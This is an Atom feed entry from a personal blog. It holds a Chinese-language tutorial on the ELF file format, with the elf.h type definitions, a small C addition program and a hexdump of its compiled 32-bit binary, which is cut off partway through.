<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MUZI&#39;s BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2020-09-10T05:27:28.810Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ELF文件格式实例解析</title>
    <link href="https://muzibing.github.io/2020/09/07/2020.09.07%EF%BC%88150%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/09/07/2020.09.07（150）/</id>
    <published>2020-09-06T16:00:00.000Z</published>
    <updated>2020-09-10T05:27:28.810Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-知识储备"><a href="#0x00-知识储备" class="headerlink" title="0x00 知识储备"></a><font color="navy">0x00 知识储备</font></h2><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><blockquote><p>接触过Linux文件的朋友应该都很清楚ELF文件，它和windows上的PE文件都是在COFF文件的基础上发展而来，一般在逆向或者说二进制安全方面都会了解其一些相关结构知识，但是由于其入门难、信息量大的原因，导致很多人（当然包括我）在看过很多遍书以后遗忘的速度仍然很快，今天我们就一起通过其源码来对ELF做个深入的了解和剖析。</p></blockquote><h3 id="2-预定义类型"><a href="#2-预定义类型" class="headerlink" title="2.预定义类型"></a>2.预定义类型</h3><blockquote><p>其结构源码被包含在<code>/usr/include/elf.h</code>文件中</p></blockquote><font size="2">首先来看一下预定义的类型</font><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type for a 16-bit quantity.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf32_Half;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint16_t</span> Elf64_Half;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Types for signed and unsigned 32-bit quantities.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf32_Sword;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf64_Word;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int32_t</span>  Elf64_Sword;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type of addresses.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Addr;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Addr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Type of file offsets.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint32_t</span> Elf32_Off;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">uint64_t</span> Elf64_Off;</span><br></pre></td></tr></table></figure><blockquote><font size="2">将上述被定义的类型总结为：</font></blockquote><div class="table-container"><table><thead><tr><th>自定义类型</th><th>描述</th><th>原始类型</th><th>长度</th></tr></thead><tbody><tr><td>ELF32_Addr</td><td>32位版本程序地址</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF32_Half</td><td>32位版本的无符号短整型</td><td>uint16_t</td><td>2</td></tr><tr><td>ELF32_Off</td><td>32位版本的偏移地址</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF32_Sword</td><td>32位版本有符号整型</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF32_Word</td><td>32位版本无符号整型</td><td>int32_t</td><td>4</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td>ELF64_Addr</td><td>64位版本程序地址</td><td>uint64_t</td><td>8</td></tr><tr><td>ELF64_Half</td><td>64位版本的无符号短整型</td><td>uint16_t</td><td>2</td></tr><tr><td>ELF64_Off</td><td>64位版本的偏移地址</td><td>uint64_t</td><td>8</td></tr><tr><td>ELF64_Sword</td><td>64位版本有符号整型</td><td>uint32_t</td><td>4</td></tr><tr><td>ELF64_Word</td><td>64位版本无符号整型</td><td>int32_t</td><td>4</td></tr></tbody></table></div><h3 id="3-ELF文件结构"><a href="#3-ELF文件结构" class="headerlink" title="3.ELF文件结构"></a>3.ELF文件结构</h3><p><img src="/images/150-1.png" alt></p><blockquote><p>图来自<a href="http://chuquan.me/2018/05/21/elf-introduce/" target="_blank" rel="noopener">计算机那些事(4)——ELF文件结构| 楚权的世界</a></p></blockquote><font size="2">从上图我们可以看出ELF温江从上到下的一个结构（按段或者说节区进行划分功能不同的数据区）</font><p><strong>注意</strong>：尽管图中显示的各个组成部分是有顺序的，实际上除了 ELF 头部表以外，其他节区和段都没有规定的顺序</p><h3 id="4-readelf和objdump工具的使用"><a href="#4-readelf和objdump工具的使用" class="headerlink" title="4.readelf和objdump工具的使用"></a>4.readelf和objdump工具的使用</h3><blockquote><p>有关这两个工具的使用，我在下图中进行了展示：</p></blockquote><p><img src="/images/150-2.jpg" alt></p><h2 id="0x01-ELF实例"><a href="#0x01-ELF实例" class="headerlink" title="0x01 ELF实例"></a><font color="navy">0x01 ELF实例</font></h2><h3 id="1-实例代码"><a href="#1-实例代码" class="headerlink" title="1.实例代码"></a>1.实例代码</h3><blockquote><p>代码如下，并将其编译成32位的ELF文件。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result;</span><br><span class="line">        result = num1 + num2;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"num1+num2 = %d\n"</span>,result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> num1, num2;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Please input the two number that you want to add:"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;num1,&amp;num2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Your input is:%d and %d\n"</span>,num1,num2);</span><br><span class="line">        add(num1,num2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Calculater is END."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-ELF文件的二进制形式"><a href="#2-ELF文件的二进制形式" class="headerlink" title="2.ELF文件的二进制形式"></a>2.ELF文件的二进制形式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br></pre></td><td class="code"><pre><span class="line">00000000  7f 45 4c 46 01 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|</span><br><span class="line">00000010  03 00 03 00 01 00 00 00  70 10 00 00 34 00 00 00  |........p...4...|</span><br><span class="line">00000020  30 38 00 00 00 00 00 00  34 00 20 00 0b 00 28 00  |08......4. ...(.|</span><br><span class="line">00000030  1e 00 1d 00 06 00 00 00  34 00 00 00 34 00 00 00  |........4...4...|</span><br><span class="line">00000040  34 00 00 00 60 01 00 00  60 01 00 00 04 00 00 00  |4...`...`.......|</span><br><span class="line">00000050  04 00 00 00 03 00 00 00  94 01 00 00 94 01 00 00  |................|</span><br><span class="line">00000060  94 01 00 00 13 00 00 00  13 00 00 00 04 00 00 00  |................|</span><br><span class="line">00000070  01 00 00 00 01 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">00000080  00 00 00 00 fc 03 00 00  fc 03 00 00 04 00 00 00  |................|</span><br><span class="line">00000090  00 10 00 00 01 00 00 00  00 10 00 00 00 10 00 00  |................|</span><br><span class="line">000000a0  00 10 00 00 fc 02 00 00  fc 02 00 00 05 00 00 00  |................|</span><br><span class="line">000000b0  00 10 00 00 01 00 00 00  00 20 00 00 00 20 00 00  |......... ... ..|</span><br><span class="line">000000c0  00 20 00 00 30 02 00 00  30 02 00 00 04 00 00 00  |. ..0...0.......|</span><br><span class="line">000000d0  00 10 00 00 01 00 00 00  f4 2e 00 00 f4 3e 00 00  |.............&gt;..|</span><br><span class="line">000000e0  f4 3e 00 00 2c 01 00 00  30 01 00 00 06 00 00 00  |.&gt;..,...0.......|</span><br><span class="line">000000f0  00 10 00 00 02 00 00 00  fc 2e 00 00 fc 3e 00 00  |.............&gt;..|</span><br><span class="line">00000100  fc 3e 00 00 f0 00 00 00  f0 00 00 00 06 00 00 00  |.&gt;..............|</span><br><span class="line">00000110  04 00 00 00 04 00 00 00  a8 01 00 00 a8 01 00 00  |................|</span><br><span class="line">00000120  a8 01 00 00 44 00 00 00  44 00 00 00 04 00 00 00  |....D...D.......|</span><br><span class="line">00000130  04 00 00 00 50 e5 74 64  7c 20 00 00 7c 20 00 00  |....P.td| ..| ..|</span><br><span class="line">00000140  7c 20 00 00 54 00 00 00  54 00 00 00 04 00 00 00  || ..T...T.......|</span><br><span class="line">00000150  04 00 00 00 51 e5 74 64  00 00 00 00 00 00 00 00  |....Q.td........|</span><br><span class="line">00000160  00 00 00 00 00 00 00 00  00 00 00 00 06 00 00 00  |................|</span><br><span class="line">00000170  10 00 00 00 52 e5 74 64  f4 2e 00 00 f4 3e 00 00  |....R.td.....&gt;..|</span><br><span class="line">00000180  f4 3e 00 00 0c 01 00 00  0c 01 00 00 04 00 00 00  |.&gt;..............|</span><br><span class="line">00000190  01 00 00 00 2f 6c 69 62  2f 6c 64 2d 6c 69 6e 75  |..../lib/ld-linu|</span><br><span class="line">000001a0  78 2e 73 6f 2e 32 00 00  04 00 00 00 14 00 00 00  |x.so.2..........|</span><br><span class="line">000001b0  03 00 00 00 47 4e 55 00  15 e3 de 80 0f 50 a8 0f  |....GNU......P..|</span><br><span class="line">000001c0  21 82 d8 42 91 b4 ef 57  ef a8 28 83 04 00 00 00  |!..B...W..(.....|</span><br><span class="line">000001d0  10 00 00 00 01 00 00 00  47 4e 55 00 00 00 00 00  |........GNU.....|</span><br><span class="line">000001e0  03 00 00 00 02 00 00 00  00 00 00 00 02 00 00 00  |................|</span><br><span class="line">000001f0  08 00 00 00 01 00 00 00  05 00 00 00 00 20 00 20  |............. . |</span><br><span class="line">00000200  00 00 00 00 08 00 00 00  ad 4b e3 c0 00 00 00 00  |.........K......|</span><br><span class="line">00000210  00 00 00 00 00 00 00 00  00 00 00 00 71 00 00 00  |............q...|</span><br><span class="line">00000220  00 00 00 00 00 00 00 00  20 00 00 00 1f 00 00 00  |........ .......|</span><br><span class="line">00000230  00 00 00 00 00 00 00 00  12 00 00 00 26 00 00 00  |............&amp;...|</span><br><span class="line">00000240  00 00 00 00 00 00 00 00  22 00 00 00 8d 00 00 00  |........&quot;.......|</span><br><span class="line">00000250  00 00 00 00 00 00 00 00  20 00 00 00 35 00 00 00  |........ ...5...|</span><br><span class="line">00000260  00 00 00 00 00 00 00 00  12 00 00 00 10 00 00 00  |................|</span><br><span class="line">00000270  00 00 00 00 00 00 00 00  12 00 00 00 9c 00 00 00  |................|</span><br><span class="line">00000280  00 00 00 00 00 00 00 00  20 00 00 00 01 00 00 00  |........ .......|</span><br><span class="line">00000290  04 20 00 00 04 00 00 00  11 00 10 00 00 5f 49 4f  |. ..........._IO|</span><br><span class="line">000002a0  5f 73 74 64 69 6e 5f 75  73 65 64 00 5f 5f 69 73  |_stdin_used.__is|</span><br><span class="line">000002b0  6f 63 39 39 5f 73 63 61  6e 66 00 70 72 69 6e 74  |oc99_scanf.print|</span><br><span class="line">000002c0  66 00 5f 5f 63 78 61 5f  66 69 6e 61 6c 69 7a 65  |f.__cxa_finalize|</span><br><span class="line">000002d0  00 5f 5f 6c 69 62 63 5f  73 74 61 72 74 5f 6d 61  |.__libc_start_ma|</span><br><span class="line">000002e0  69 6e 00 6c 69 62 63 2e  73 6f 2e 36 00 47 4c 49  |in.libc.so.6.GLI|</span><br><span class="line">000002f0  42 43 5f 32 2e 37 00 47  4c 49 42 43 5f 32 2e 31  |BC_2.7.GLIBC_2.1|</span><br><span class="line">00000300  2e 33 00 47 4c 49 42 43  5f 32 2e 30 00 5f 49 54  |.3.GLIBC_2.0._IT|</span><br><span class="line">00000310  4d 5f 64 65 72 65 67 69  73 74 65 72 54 4d 43 6c  |M_deregisterTMCl|</span><br><span class="line">00000320  6f 6e 65 54 61 62 6c 65  00 5f 5f 67 6d 6f 6e 5f  |oneTable.__gmon_|</span><br><span class="line">00000330  73 74 61 72 74 5f 5f 00  5f 49 54 4d 5f 72 65 67  |start__._ITM_reg|</span><br><span class="line">00000340  69 73 74 65 72 54 4d 43  6c 6f 6e 65 54 61 62 6c  |isterTMCloneTabl|</span><br><span class="line">00000350  65 00 00 00 00 00 02 00  03 00 00 00 02 00 04 00  |e...............|</span><br><span class="line">00000360  00 00 01 00 01 00 03 00  47 00 00 00 10 00 00 00  |........G.......|</span><br><span class="line">00000370  00 00 00 00 17 69 69 0d  00 00 04 00 51 00 00 00  |.....ii.....Q...|</span><br><span class="line">00000380  10 00 00 00 73 1f 69 09  00 00 03 00 5b 00 00 00  |....s.i.....[...|</span><br><span class="line">00000390  10 00 00 00 10 69 69 0d  00 00 02 00 67 00 00 00  |.....ii.....g...|</span><br><span class="line">000003a0  00 00 00 00 f4 3e 00 00  08 00 00 00 f8 3e 00 00  |.....&gt;.......&gt;..|</span><br><span class="line">000003b0  08 00 00 00 f8 3f 00 00  08 00 00 00 1c 40 00 00  |.....?.......@..|</span><br><span class="line">000003c0  08 00 00 00 ec 3f 00 00  06 01 00 00 f0 3f 00 00  |.....?.......?..|</span><br><span class="line">000003d0  06 03 00 00 f4 3f 00 00  06 04 00 00 fc 3f 00 00  |.....?.......?..|</span><br><span class="line">000003e0  06 07 00 00 0c 40 00 00  07 02 00 00 10 40 00 00  |.....@.......@..|</span><br><span class="line">000003f0  07 05 00 00 14 40 00 00  07 06 00 00 00 00 00 00  |.....@..........|</span><br><span class="line">00000400  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00001000  53 83 ec 08 e8 a7 00 00  00 81 c3 f7 2f 00 00 8b  |S.........../...|</span><br><span class="line">00001010  83 f4 ff ff ff 85 c0 74  02 ff d0 83 c4 08 5b c3  |.......t......[.|</span><br><span class="line">00001020  ff b3 04 00 00 00 ff a3  08 00 00 00 00 00 00 00  |................|</span><br><span class="line">00001030  ff a3 0c 00 00 00 68 00  00 00 00 e9 e0 ff ff ff  |......h.........|</span><br><span class="line">00001040  ff a3 10 00 00 00 68 08  00 00 00 e9 d0 ff ff ff  |......h.........|</span><br><span class="line">00001050  ff a3 14 00 00 00 68 10  00 00 00 e9 c0 ff ff ff  |......h.........|</span><br><span class="line">00001060  ff a3 f0 ff ff ff 66 90  00 00 00 00 00 00 00 00  |......f.........|</span><br><span class="line">00001070  31 ed 5e 89 e1 83 e4 f0  50 54 52 e8 22 00 00 00  |1.^.....PTR.&quot;...|</span><br><span class="line">00001080  81 c3 80 2f 00 00 8d 83  e0 d2 ff ff 50 8d 83 80  |.../........P...|</span><br><span class="line">00001090  d2 ff ff 50 51 56 ff b3  f8 ff ff ff e8 9f ff ff  |...PQV..........|</span><br><span class="line">000010a0  ff f4 8b 1c 24 c3 66 90  66 90 66 90 66 90 66 90  |....$.f.f.f.f.f.|</span><br><span class="line">000010b0  8b 1c 24 c3 66 90 66 90  66 90 66 90 66 90 66 90  |..$.f.f.f.f.f.f.|</span><br><span class="line">000010c0  e8 e0 00 00 00 81 c2 3b  2f 00 00 8d 8a 20 00 00  |.......;/.... ..|</span><br><span class="line">000010d0  00 8d 82 20 00 00 00 39  c8 74 1d 8b 82 ec ff ff  |... ...9.t......|</span><br><span class="line">000010e0  ff 85 c0 74 13 55 89 e5  83 ec 14 51 ff d0 83 c4  |...t.U.....Q....|</span><br><span class="line">000010f0  10 c9 c3 8d 74 26 00 90  c3 8d b4 26 00 00 00 00  |....t&amp;.....&amp;....|</span><br><span class="line">00001100  e8 a0 00 00 00 81 c2 fb  2e 00 00 55 89 e5 53 8d  |...........U..S.|</span><br><span class="line">00001110  8a 20 00 00 00 8d 82 20  00 00 00 83 ec 04 29 c8  |. ..... ......).|</span><br><span class="line">00001120  89 c3 c1 e8 1f c1 fb 02  01 d8 d1 f8 74 14 8b 92  |............t...|</span><br><span class="line">00001130  fc ff ff ff 85 d2 74 0a  83 ec 08 50 51 ff d2 83  |......t....PQ...|</span><br><span class="line">00001140  c4 10 8b 5d fc c9 c3 8d  b4 26 00 00 00 00 66 90  |...].....&amp;....f.|</span><br><span class="line">00001150  55 89 e5 53 e8 57 ff ff  ff 81 c3 a7 2e 00 00 83  |U..S.W..........|</span><br><span class="line">00001160  ec 04 80 bb 20 00 00 00  00 75 27 8b 83 f0 ff ff  |.... ....u&apos;.....|</span><br><span class="line">00001170  ff 85 c0 74 11 83 ec 0c  ff b3 1c 00 00 00 e8 dd  |...t............|</span><br><span class="line">00001180  fe ff ff 83 c4 10 e8 35  ff ff ff c6 83 20 00 00  |.......5..... ..|</span><br><span class="line">00001190  00 01 8b 5d fc c9 c3 8d  b4 26 00 00 00 00 66 90  |...].....&amp;....f.|</span><br><span class="line">000011a0  e9 5b ff ff ff 8b 14 24  c3 55 89 e5 53 83 ec 14  |.[.....$.U..S...|</span><br><span class="line">000011b0  e8 c4 00 00 00 05 4b 2e  00 00 8b 4d 08 8b 55 0c  |......K....M..U.|</span><br><span class="line">000011c0  01 ca 89 55 f4 83 ec 08  ff 75 f4 8d 90 08 e0 ff  |...U.....u......|</span><br><span class="line">000011d0  ff 52 89 c3 e8 57 fe ff  ff 83 c4 10 90 8b 5d fc  |.R...W........].|</span><br><span class="line">000011e0  c9 c3 8d 4c 24 04 83 e4  f0 ff 71 fc 55 89 e5 53  |...L$.....q.U..S|</span><br><span class="line">000011f0  51 83 ec 10 e8 b7 fe ff  ff 81 c3 07 2e 00 00 83  |Q...............|</span><br><span class="line">00001200  ec 0c 8d 83 18 e0 ff ff  50 e8 22 fe ff ff 83 c4  |........P.&quot;.....|</span><br><span class="line">00001210  10 83 ec 04 8d 45 f0 50  8d 45 f4 50 8d 83 4a e0  |.....E.P.E.P..J.|</span><br><span class="line">00001220  ff ff 50 e8 28 fe ff ff  83 c4 10 8b 55 f0 8b 45  |..P.(.......U..E|</span><br><span class="line">00001230  f4 83 ec 04 52 50 8d 83  4f e0 ff ff 50 e8 ee fd  |....RP..O...P...|</span><br><span class="line">00001240  ff ff 83 c4 10 8b 55 f0  8b 45 f4 83 ec 08 52 50  |......U..E....RP|</span><br><span class="line">00001250  e8 54 ff ff ff 83 c4 10  83 ec 0c 8d 83 68 e0 ff  |.T...........h..|</span><br><span class="line">00001260  ff 50 e8 c9 fd ff ff 83  c4 10 b8 00 00 00 00 8d  |.P..............|</span><br><span class="line">00001270  65 f8 59 5b 5d 8d 61 fc  c3 8b 04 24 c3 66 90 90  |e.Y[].a....$.f..|</span><br><span class="line">00001280  55 e8 5b 00 00 00 81 c5  7a 2d 00 00 57 56 53 83  |U.[.....z-..WVS.|</span><br><span class="line">00001290  ec 0c 89 eb 8b 7c 24 28  e8 63 fd ff ff 8d 9d f8  |.....|$(.c......|</span><br><span class="line">000012a0  fe ff ff 8d 85 f4 fe ff  ff 29 c3 c1 fb 02 74 25  |.........)....t%|</span><br><span class="line">000012b0  31 f6 8d b6 00 00 00 00  83 ec 04 57 ff 74 24 2c  |1..........W.t$,|</span><br><span class="line">000012c0  ff 74 24 2c ff 94 b5 f4  fe ff ff 83 c6 01 83 c4  |.t$,............|</span><br><span class="line">000012d0  10 39 f3 75 e3 83 c4 0c  5b 5e 5f 5d c3 8d 76 00  |.9.u....[^_]..v.|</span><br><span class="line">000012e0  c3 8b 2c 24 c3 00 00 00  53 83 ec 08 e8 bf fd ff  |..,$....S.......|</span><br><span class="line">000012f0  ff 81 c3 0f 2d 00 00 83  c4 08 5b c3 00 00 00 00  |....-.....[.....|</span><br><span class="line">00001300  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|</span><br><span class="line">*</span><br><span class="line">00002000  03 00 00 00 01 00 02 00  6e 75 6d 31 2b 6e 75 6d  |........num1+num|</span><br><span class="line">00002010  32 20 3d 20 25 64 0a 00  50 6c 65 61 73 65 20 69  |2 = %d..Please i|</span><br><span class="line">00002020  6e 70 75 74 20 74 68 65  20 74 77 6f 20 6e 75 6d  |nput the two num|</span><br><span class="line">00002030  62 65 72 20 74 68 61 74  20 79 6f 75 20 77 61 